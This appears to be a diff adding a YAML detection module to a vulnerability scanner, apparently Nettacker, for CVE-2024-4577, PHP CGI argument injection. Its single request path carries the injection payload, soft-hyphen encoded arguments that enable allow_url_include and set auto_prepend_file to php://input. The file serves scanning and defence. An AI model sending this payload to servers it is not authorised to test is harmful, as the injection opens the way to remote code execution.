@@ -1,0 +1,17 @@
+info:
+  name: php_cgi_arg_injection_vuln
+  category: vuln
+  severity: CRITICAL
+  description: Detects CVE-2024-4577 - PHP CGI Argument Injection Remote Code Execution
+  author: ayush-codes6439
+
+payloads:
+  - library: http
+    steps:
+      - request:
+          method: GET
+          path: "/?%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
+          headers:
+            User-Agent: "Nettacker-Scanner"
+        response:
+          status_code: 200
